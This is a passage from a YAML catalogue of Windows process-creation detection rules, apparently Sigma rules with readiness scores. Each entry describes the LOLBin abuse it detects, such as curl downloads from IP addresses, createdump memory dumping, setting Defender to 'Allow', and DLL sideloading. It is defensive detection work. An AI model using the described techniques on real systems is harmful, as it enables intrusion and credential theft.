  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Execution
  techniques:
  - T1059
  tags:
  - attack.execution
  - attack.t1059
  time_window: ''
  references:
  - https://www.elastic.co/guide/en/security/current/conhost-spawned-by-suspicious-parent-process.html
  false_positives:
  - Unknown
  notes: ''
- detection_id: 0ba863e6-def5-4e50-9cea-4dd8c7dc46a4
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_control_panel_item.yml
  name: Control Panel Items
  description: Detects the malicious use of a control panel item
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Execution
  - Persistence
  techniques:
  - T1218.002
  - T1546
  tags:
  - attack.privilege-escalation
  - attack.execution
  - attack.defense-evasion
  - attack.t1218.002
  - attack.persistence
  - attack.t1546
  time_window: ''
  references:
  - https://ired.team/offensive-security/code-execution/code-execution-through-control-panel-add-ins
  false_positives:
  - Unknown
  notes: ''
- detection_id: 515c8be5-e5df-4c5e-8f6d-a4a2f05e4b48
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_createdump_lolbin_execution.yml
  name: CreateDump Process Dump
  description: Detects uses of the createdump.exe LOLOBIN utility to dump process
    memory
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics: []
  techniques:
  - T1003.001
  - T1036
  tags:
  - attack.defense-evasion
  - attack.t1036
  - attack.t1003.001
  - attack.credential-access
  time_window: ''
  references:
  - https://www.crowdstrike.com/blog/overwatch-exposes-aquatic-panda-in-possession-of-log-4-shell-exploit-tools/
  - https://twitter.com/bopin2020/status/1366400799199272960
  false_positives:
  - Command lines that use the same flags
  notes: ''
- detection_id: dcaa3f04-70c3-427a-80b4-b870d73c94c4
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_csc_susp_dynamic_compilation.yml
  name: Dynamic .NET Compilation Via Csc.EXE
  description: Detects execution of "csc.exe" to compile .NET code. Attackers often
    leverage this to compile code on the fly and use it in other stages.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics: []
  techniques:
  - T1027.004
  tags:
  - attack.defense-evasion
  - attack.t1027.004
  time_window: ''
  references:
  - https://securityboulevard.com/2019/08/agent-tesla-evading-edr-by-removing-api-hooks/
  - https://www.clearskysec.com/wp-content/uploads/2018/11/MuddyWater-Operations-in-Lebanon-and-Oman.pdf
  - https://app.any.run/tasks/c6993447-d1d8-414e-b856-675325e5aa09/
  - https://twitter.com/gN3mes1s/status/1206874118282448897
  - https://github.com/redcanaryco/atomic-red-team/blob/b27a3cb25025161d49ac861cb216db68c46a3537/atomics/T1027.004/T1027.004.md#atomic-test-1---compile-after-delivery-using-cscexe
  false_positives:
  - Legitimate software from program files - https://twitter.com/gN3mes1s/status/1206874118282448897
  - Legitimate Microsoft software - https://twitter.com/gabriele_pippi/status/1206907900268072962
  - Ansible
  notes: ''
- detection_id: b730a276-6b63-41b8-bcf8-55930c8fc6ee
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_csc_susp_parent.yml
  name: Csc.EXE Execution Form Potentially Suspicious Parent
  description: Detects a potentially suspicious parent of "csc.exe", which could be
    a sign of payload delivery.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Execution
  techniques:
  - T1027.004
  - T1059.005
  - T1059.007
  - T1218.005
  tags:
  - attack.execution
  - attack.t1059.005
  - attack.t1059.007
  - attack.defense-evasion
  - attack.t1218.005
  - attack.t1027.004
  time_window: ''
  references:
  - https://www.uptycs.com/blog/warzonerat-can-now-evade-with-process-hollowing
  - https://reaqta.com/2017/11/short-journey-darkvnc/
  - https://www.pwc.com/gx/en/issues/cybersecurity/cyber-threat-intelligence/yellow-liderc-ships-its-scripts-delivers-imaploader-malware.html
  false_positives:
  - Unknown
  notes: ''
- detection_id: 40b95d31-1afc-469e-8d34-9a3a667d058e
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_csi_execution.yml
  name: Suspicious Csi.exe Usage
  description: Csi.exe is a signed binary from Microsoft that comes with Visual Studio
    and provides C# interactive capabilities. It can be used to run C# code from a
    file passed as a parameter in command line. Early version of this utility provided
    with Microsoft Roslyn Community Technology Preview was named 'rcsi.exe'
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Execution
  techniques:
  - T1072
  - T1218
  tags:
  - attack.lateral-movement
  - attack.execution
  - attack.t1072
  - attack.defense-evasion
  - attack.t1218
  time_window: ''
  references:
  - https://lolbas-project.github.io/lolbas/OtherMSBinaries/Csi/
  - https://lolbas-project.github.io/lolbas/OtherMSBinaries/Rcsi/
  - https://enigma0x3.net/2016/11/21/bypassing-application-whitelisting-by-using-rcsi-exe/
  - https://twitter.com/Z3Jpa29z/status/1317545798981324801
  false_positives:
  - Legitimate usage by software developers
  notes: ''
- detection_id: a9e416a8-e613-4f8b-88b8-a7d1d1af2f61
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_csi_use_of_csharp_console.yml
  name: Suspicious Use of CSharp Interactive Console
  description: Detects the execution of CSharp interactive console by PowerShell
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Execution
  techniques:
  - T1127
  tags:
  - attack.execution
  - attack.defense-evasion
  - attack.t1127
  time_window: ''
  references:
  - https://redcanary.com/blog/detecting-attacks-leveraging-the-net-framework/
  false_positives:
  - Possible depending on environment. Pair with other factors such as net connections,
    command-line args, etc.
  notes: ''
- detection_id: e5d36acd-acb4-4c6f-a13f-9eb203d50099
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_csvde_export.yml
  name: Active Directory Structure Export Via Csvde.EXE
  description: Detects the execution of "csvde.exe" in order to export organizational
    Active Directory structure.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Discovery
  - Exfiltration
  techniques:
  - T1087.002
  tags:
  - attack.exfiltration
  - attack.discovery
  - attack.t1087.002
  time_window: ''
  references:
  - https://www.cybereason.com/blog/research/operation-ghostshell-novel-rat-targets-global-aerospace-and-telecoms-firms
  - https://web.archive.org/web/20180725233601/https://www.pwc.co.uk/cyber-security/pdf/cloud-hopper-annex-b-final.pdf
  - https://businessinsights.bitdefender.com/deep-dive-into-a-backdoordiplomacy-attack-a-study-of-an-attackers-toolkit
  - https://redcanary.com/blog/msix-installers/
  false_positives:
  - Unknown
  notes: ''
- detection_id: 5a6e1e16-07de-48d8-8aae-faa766c05e88
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_curl_cookie_hijacking.yml
  name: Potential Cookies Session Hijacking
  description: Detects execution of "curl.exe" with the "-c" flag in order to save
    cookie data.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Execution
  techniques: []
  tags:
  - attack.execution
  time_window: ''
  references:
  - https://curl.se/docs/manpage.html
  false_positives:
  - Unknown
  notes: ''
- detection_id: 85de1f22-d189-44e4-8239-dc276b45379b
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_curl_custom_user_agent.yml
  name: Curl Web Request With Potential Custom User-Agent
  description: Detects execution of "curl.exe" with a potential custom "User-Agent".
    Attackers can leverage this to download or exfiltrate data via "curl" to a domain
    that only accept specific "User-Agent" strings
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  - guardrail:ioc_only_cap
  severity: medium
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Execution
  techniques: []
  tags:
  - attack.execution
  time_window: ''
  references:
  - https://labs.withsecure.com/publications/fin7-target-veeam-servers
  - https://github.com/WithSecureLabs/iocs/blob/344203de742bb7e68bd56618f66d34be95a9f9fc/FIN7VEEAM/iocs.csv
  false_positives:
  - Unknown
  notes: ''
- detection_id: 9cc85849-3b02-4cb5-b371-3a1ff54f2218
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_curl_download_direct_ip_exec.yml
  name: File Download From IP URL Via Curl.EXE
  description: Detects file downloads directly from IP address URL using curl.exe
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  - guardrail:ioc_only_cap
  severity: medium
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Execution
  techniques: []
  tags:
  - attack.execution
  time_window: ''
  references:
  - https://labs.withsecure.com/publications/fin7-target-veeam-servers
  - https://github.com/WithSecureLabs/iocs/blob/344203de742bb7e68bd56618f66d34be95a9f9fc/FIN7VEEAM/iocs.csv
  - https://github.com/pr0xylife/IcedID/blob/8dd1e218460db4f750d955b4c65b2f918a1db906/icedID_09.28.2023.txt
  false_positives:
  - Unknown
  notes: ''
- detection_id: 5cb299fc-5fb1-4d07-b989-0644c68b6043
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_curl_download_direct_ip_susp_extensions.yml
  name: Suspicious File Download From IP Via Curl.EXE
  description: Detects potentially suspicious file downloads directly from IP addresses
    using curl.exe
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  - guardrail:ioc_only_cap
  severity: high
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Execution
  techniques: []
  tags:
  - attack.execution
  time_window: ''
  references:
  - https://labs.withsecure.com/publications/fin7-target-veeam-servers
  - https://github.com/WithSecureLabs/iocs/blob/344203de742bb7e68bd56618f66d34be95a9f9fc/FIN7VEEAM/iocs.csv
  - https://github.com/pr0xylife/IcedID/blob/8dd1e218460db4f750d955b4c65b2f918a1db906/icedID_09.28.2023.txt
  false_positives:
  - Unknown
  notes: ''
- detection_id: 56454143-524f-49fb-b1c6-3fb8b1ad41fb
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_curl_download_susp_file_sharing_domains.yml
  name: Suspicious File Download From File Sharing Domain Via Curl.EXE
  description: Detects potentially suspicious file download from file sharing domains
    using curl.exe
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  - guardrail:ioc_only_cap
  severity: high
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Execution
  techniques: []
  tags:
  - attack.execution
  time_window: ''
  references:
  - https://labs.withsecure.com/publications/fin7-target-veeam-servers
  - https://github.com/WithSecureLabs/iocs/blob/344203de742bb7e68bd56618f66d34be95a9f9fc/FIN7VEEAM/iocs.csv
  false_positives:
  - Unknown
  notes: ''
- detection_id: cb9cc1d1-e84e-4bdc-b7ad-c31b1b7908ec
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_curl_insecure_connection.yml
  name: Insecure Transfer Via Curl.EXE
  description: Detects execution of "curl.exe" with the "--insecure" flag.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Execution
  techniques: []
  tags:
  - attack.execution
  time_window: ''
  references:
  - https://curl.se/docs/manpage.html
  false_positives:
  - Access to badly maintained internal or development systems
  notes: ''
- detection_id: 2c1486f5-02e8-4f86-9099-b97f2da4ed77
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_curl_insecure_proxy_or_doh.yml
  name: Insecure Proxy/DOH Transfer Via Curl.EXE
  description: Detects execution of "curl.exe" with the "insecure" flag over proxy
    or DOH.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Execution
  techniques: []
  tags:
  - attack.execution
  time_window: ''
  references:
  - https://curl.se/docs/manpage.html
  false_positives:
  - Access to badly maintained internal or development systems
  notes: ''
- detection_id: aa6f6ea6-0676-40dd-b510-6e46f02d8867
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_curl_local_file_read.yml
  name: Local File Read Using Curl.EXE
  description: Detects execution of "curl.exe" with the "file://" protocol handler
    in order to read local files.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Execution
  techniques: []
  tags:
  - attack.execution
  time_window: ''
  references:
  - https://curl.se/docs/manpage.html
  false_positives:
  - Unknown
  notes: ''
- detection_id: e218595b-bbe7-4ee5-8a96-f32a24ad3468
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_curl_susp_download.yml
  name: Suspicious Curl.EXE Download
  description: Detects a suspicious curl process start on Windows and outputs the
    requested document to a local file
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics: []
  techniques:
  - T1105
  tags:
  - attack.command-and-control
  - attack.t1105
  time_window: ''
  references:
  - https://twitter.com/max_mal_/status/1542461200797163522
  - https://web.archive.org/web/20200128160046/https://twitter.com/reegun21/status/1222093798009790464
  - https://github.com/pr0xylife/Qakbot/blob/4f0795d79dabee5bc9dd69f17a626b48852e7869/Qakbot_AA_23.06.2022.txt
  - https://www.volexity.com/blog/2022/07/28/sharptongue-deploys-clever-mail-stealing-browser-extension-sharpext/
  - https://github.com/redcanaryco/atomic-red-team/blob/0f229c0e42bfe7ca736a14023836d65baa941ed2/atomics/T1105/T1105.md#atomic-test-18---curl-download-file
  false_positives:
  - Unknown
  notes: ''
- detection_id: 84b14121-9d14-416e-800b-f3b829c5a14d
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_customshellhost_susp_exec.yml
  name: Suspicious CustomShellHost Execution
  description: 'Detects the execution of CustomShellHost.exe where the child isn''t
    located in ''C:\Windows\explorer.exe''. CustomShellHost is a known LOLBin that
    can be abused by attackers for defense evasion techniques.

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics: []
  techniques:
  - T1216
  tags:
  - attack.defense-evasion
  - attack.t1216
  time_window: ''
  references:
  - https://github.com/LOLBAS-Project/LOLBAS/pull/180
  - https://lolbas-project.github.io/lolbas/Binaries/CustomShellHost/
  false_positives:
  - False positives are unlikely, investigate matches carefully.
  notes: ''
- detection_id: 6345b048-8441-43a7-9bed-541133633d7a
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_dctask64_arbitrary_command_and_dll_execution.yml
  name: ManageEngine Endpoint Central Dctask64.EXE Potential Abuse
  description: 'Detects the execution of "dctask64.exe", a signed binary by ZOHO Corporation
    part of ManageEngine Endpoint Central.

    This binary can be abused for DLL injection, arbitrary command and process execution.

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  - guardrail:ioc_only_cap
  severity: high
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics: []
  techniques:
  - T1055.001
  tags:
  - attack.privilege-escalation
  - attack.defense-evasion
  - attack.t1055.001
  time_window: ''
  references:
  - https://twitter.com/gN3mes1s/status/1222088214581825540
  - https://twitter.com/gN3mes1s/status/1222095963789111296
  - https://twitter.com/gN3mes1s/status/1222095371175911424
  false_positives:
  - Unknown
  notes: ''
- detection_id: b2309017-4235-44fe-b5af-b15363011957
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_defaultpack_uncommon_child_process.yml
  name: Uncommon Child Process Of Defaultpack.EXE
  description: Detects uncommon child processes of "DefaultPack.EXE" binary as a proxy
    to launch other programs
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Execution
  techniques:
  - T1218
  tags:
  - attack.t1218
  - attack.defense-evasion
  - attack.execution
  time_window: ''
  references:
  - https://lolbas-project.github.io/lolbas/OtherMSBinaries/DefaultPack/
  - https://www.echotrail.io/insights/search/defaultpack.exe
  false_positives:
  - Unknown
  notes: ''
- detection_id: 1e8a9b4d-3c2a-4f9b-8d1e-7c6a5b4f3d2e
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_defender_default_action_modified.yml
  name: PowerShell Defender Threat Severity Default Action Set to 'Allow' or 'NoAction'
  description: 'Detects the use of PowerShell to execute the ''Set-MpPreference''
    cmdlet to configure Windows Defender''s threat severity default action to ''Allow''
    (value ''6'') or ''NoAction'' (value ''9'').

    This is a highly suspicious configuration change that effectively disables Defender''s
    ability to automatically mitigate threats of a certain severity level.

    An attacker might use this technique via the command line to bypass defenses before
    executing payloads.

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: experimental
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics: []
  techniques:
  - T1562.001
  tags:
  - attack.defense-evasion
  - attack.t1562.001
  time_window: ''
  references:
  - https://learn.microsoft.com/en-us/powershell/module/defender/set-mppreference
  - https://learn.microsoft.com/en-us/windows-hardware/customize/desktop/unattend/security-malware-windows-defender-threatseveritydefaultaction
  - https://research.splunk.com/endpoint/7215831c-8252-4ae3-8d43-db588e82f952
  - https://gist.github.com/Dump-GUY/8daef859f382b895ac6fd0cf094555d2
  - https://thedfirreport.com/2021/10/18/icedid-to-xinglocker-ransomware-in-24-hours/
  false_positives:
  - Highly unlikely
  notes: ''
- detection_id: b9e8c7d6-a5f4-4e3d-8b1a-9f0c8d7e6a5b
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_defender_remove_context_menu.yml
  name: Windows Defender Context Menu Removed
  description: 'Detects the use of reg.exe or PowerShell to delete the Windows Defender
    context menu handler registry keys.

    This action removes the "Scan with Microsoft Defender" option from the right-click
    menu for files, directories, and drives.

    Attackers may use this technique to hinder manual, on-demand scans and reduce
    the visibility of the security product.

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: experimental
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics: []
  techniques:
  - T1562.001
  tags:
  - attack.defense-evasion
  - attack.t1562.001
  time_window: ''
  references:
  - https://research.splunk.com/endpoint/395ed5fe-ad13-4366-9405-a228427bdd91/
  - https://winaero.com/how-to-delete-scan-with-windows-defender-from-context-menu-in-windows-10/
  - https://thedfirreport.com/2021/10/18/icedid-to-xinglocker-ransomware-in-24-hours/
  - https://blog.malwarebytes.com/malwarebytes-news/2021/02/lazyscripter-from-empire-to-double-rat/
  false_positives:
  - May be part of a system customization or "debloating" script, but this is highly
    unusual in a managed corporate environment.
  notes: ''
- detection_id: 214641c2-c579-4ecb-8427-0cf19df6842e
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_desktopimgdownldr_remote_file_download.yml
  name: Remote File Download Via Desktopimgdownldr Utility
  description: Detects the desktopimgdownldr utility being used to download a remote
    file. An adversary may use desktopimgdownldr to download arbitrary files as an
    alternative to certutil.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics: []
  techniques:
  - T1105
  tags:
  - attack.command-and-control
  - attack.t1105
  time_window: ''
  references:
  - https://www.elastic.co/guide/en/security/current/remote-file-download-via-desktopimgdownldr-utility.html
  false_positives:
  - Unknown
  notes: ''
- detection_id: bb58aa4a-b80b-415a-a2c0-2f65a4c81009
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_desktopimgdownldr_susp_execution.yml
  name: Suspicious Desktopimgdownldr Command
  description: Detects a suspicious Microsoft desktopimgdownldr execution with parameters
    used to download files from the Internet
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics: []
  techniques:
  - T1105
  tags:
  - attack.command-and-control
  - attack.t1105
  time_window: ''
  references:
  - https://labs.sentinelone.com/living-off-windows-land-a-new-native-file-downldr/
  - https://twitter.com/SBousseaden/status/1278977301745741825
  false_positives:
  - False positives depend on scripts and administrative tools used in the monitored
    environment
  notes: ''
- detection_id: b8b1b304-a60f-4999-9a6e-c547bde03ffd
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_device_credential_deployment.yml
  name: DeviceCredentialDeployment Execution
  description: 'Detects the execution of DeviceCredentialDeployment to hide a process
    from view.

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics: []
  techniques:
  - T1218
  tags:
  - attack.defense-evasion
  - attack.t1218
  time_window: ''
  references:
  - https://github.com/LOLBAS-Project/LOLBAS/pull/147
  false_positives:
  - Unlikely
  notes: ''
- detection_id: e173ad47-4388-4012-ae62-bd13f71c18a8
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_deviceenroller_dll_sideloading.yml
  name: Potential DLL Sideloading Via DeviceEnroller.EXE
  description: 'Detects the use of the PhoneDeepLink parameter to potentially sideload
    a DLL file that does not exist. This non-existent DLL file is named "ShellChromeAPI.dll".

    Adversaries can drop their own renamed DLL and execute it via DeviceEnroller.exe
    using this parameter

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Persistence
  techniques:
  - T1574.001
  tags:
  - attack.privilege-escalation
  - attack.persistence
  - attack.defense-evasion
  - attack.t1574.001
  time_window: ''
  references:
  - https://mobile.twitter.com/0gtweet/status/1564131230941122561
  - https://strontic.github.io/xcyclopedia/library/DeviceEnroller.exe-24BEF0D6B0ECED36BB41831759FDE18D.html
  false_positives:
  - Unknown
  notes: ''
- detection_id: 90d50722-0483-4065-8e35-57efaadd354d
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_devinit_lolbin_usage.yml
  name: Arbitrary MSI Download Via Devinit.EXE
  description: Detects a certain command line flag combination used by "devinit.exe",
    which can be abused as a LOLBIN to download arbitrary MSI packages on a Windows
    system
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Execution
  techniques:
  - T1218
  tags:
  - attack.execution
  - attack.defense-evasion
  - attack.t1218
  time_window: ''
  references:
  - https://twitter.com/mrd0x/status/1460815932402679809
  - https://lolbas-project.github.io/lolbas/OtherMSBinaries/Devinit/
  false_positives:
  - Unknown
  notes: ''
- detection_id: 67bc0e75-c0a9-4cfc-8754-84a505b63c04
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_dfsvc_suspicious_child_processes.yml
  name: Potentially Suspicious Child Process Of ClickOnce Application
  description: Detects potentially suspicious child processes of a ClickOnce deployment
    application
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Execution
  techniques: []
  tags:
  - attack.execution
  - attack.defense-evasion
  time_window: ''
  references:
  - https://posts.specterops.io/less-smartscreen-more-caffeine-ab-using-clickonce-for-trusted-code-execution-1446ea8051c5
  false_positives:
  - Unknown
  notes: ''
- detection_id: b4dc61f5-6cce-468e-a608-b48b469feaa2
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_dirlister_execution.yml
  name: DirLister Execution
  description: Detect the usage of "DirLister.exe" a utility for quickly listing folder
    or drive contents. It was seen used by BlackCat ransomware to create a list of
    accessible directories and files.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: low
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Discovery
  techniques:
  - T1083
  tags:
  - attack.discovery
  - attack.t1083
  time_window: ''
  references:
  - https://github.com/redcanaryco/atomic-red-team/blob/40b77d63808dd4f4eafb83949805636735a1fd15/atomics/T1083/T1083.md
  - https://news.sophos.com/en-us/2022/07/14/blackcat-ransomware-attacks-not-merely-a-byproduct-of-bad-luck/
  false_positives:
  - Legitimate use by users
  notes: ''
- detection_id: 0022869c-49f7-4ff2-ba03-85ac42ddac58
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_discovery_via_reg_queries.yml
  name: System Information Discovery via Registry Queries
  description: Detects attempts to query system information directly from the Windows
    Registry.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: low
  status: experimental
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Discovery
  techniques:
  - T1082
  tags:
  - attack.discovery
  - attack.t1082
  time_window: ''
  references:
  - https://cert.gov.ua/article/6277849
  - https://github.com/redcanaryco/atomic-red-team/blob/75fa21076dcefa348a7521403cdd6bfc4e88623c/atomics/T1082/T1082.md
  - https://github.com/redcanaryco/atomic-red-team/blob/75fa21076dcefa348a7521403cdd6bfc4e88623c/atomics/T1124/T1124.md
  false_positives:
  - Unlikely
  notes: ''
- detection_id: 9f546b25-5f12-4c8d-8532-5893dcb1e4b8
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_diskshadow_child_process_susp.yml
  name: Potentially Suspicious Child Process Of DiskShadow.EXE
  description: Detects potentially suspicious child processes of "Diskshadow.exe".
    This could be an attempt to bypass parent/child relationship detection or application
    whitelisting rules.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics: []
  techniques:
  - T1218
  tags:
  - attack.defense-evasion
  - attack.t1218
  time_window: ''
  references:
  - https://bohops.com/2018/03/26/diskshadow-the-return-of-vss-evasion-persistence-and-active-directory-database-extraction/
  - https://www.ired.team/offensive-security/credential-access-and-credential-dumping/ntds.dit-enumeration
  - https://medium.com/@cyberjyot/lolbin-execution-via-diskshadow-f6ff681a27a4
  - https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/diskshadow
  - https://www.lifars.com/wp-content/uploads/2022/01/GriefRansomware_Whitepaper-2.pdf
  - https://www.zscaler.com/blogs/security-research/technical-analysis-crytox-ransomware
